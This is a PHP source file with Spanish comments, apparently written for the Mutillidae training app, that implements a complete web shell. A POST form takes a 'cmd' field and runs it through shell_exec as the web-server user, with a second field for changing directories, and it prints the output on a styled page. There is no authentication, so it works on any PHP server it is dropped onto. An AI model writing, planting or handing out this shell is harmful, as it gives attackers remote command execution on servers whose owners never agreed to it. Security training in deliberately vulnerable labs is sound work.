```
<?php
// mutillidae_web_shell.php

// Función para obtener la ruta actual
function getCurrentPath() {
    return getcwd();
}

// Cambiar directorio (solo dentro de PHP)
if(isset($_POST['cd']) && !empty($_POST['cd'])) {
    $dir = $_POST['cd'];
    if(is_dir($dir)) {
        chdir($dir);
    } else {
        $error = "Directorio no válido: $dir";
    }
}

// Ejecutar comando como usuario web
$output = '';
if(isset($_POST['cmd']) && !empty($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $output = shell_exec($cmd . ' 2>&1');  // salida de errores incluida
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Web Shell Mutillidae</title>
<style>
body { font-family: monospace; background:#1e1e1e; color:#cfcfcf; padding:20px; }
input[type=text] { width:400px; background:#2e2e2e; color:#cfcfcf; border:none; padding:5px; margin-right:5px; }
input[type=submit] { padding:5px 10px; }
pre { background:#2e2e2e; padding:10px; white-space: pre-wrap; word-wrap: break-word; }
.error { color: #ff5555; }
</style>
</head>
<body>
<h2>Web Shell Mutillidae - Usuario Web</h2>

<p><strong>Ruta actual:</strong> <?php echo getCurrentPath(); ?></p>

<form method="post">
    <input type="text" name="cd" placeholder="Cambiar directorio">
    <input type="text" name="cmd" placeholder="Ejecutar comando">
    <input type="submit" value="Ejecutar">
</form>

<?php if(!empty($error)) { echo "<p class='error'>$error</p>"; } ?>

<pre><?php echo htmlspecialchars($output); ?></pre>
</body>
</html>

```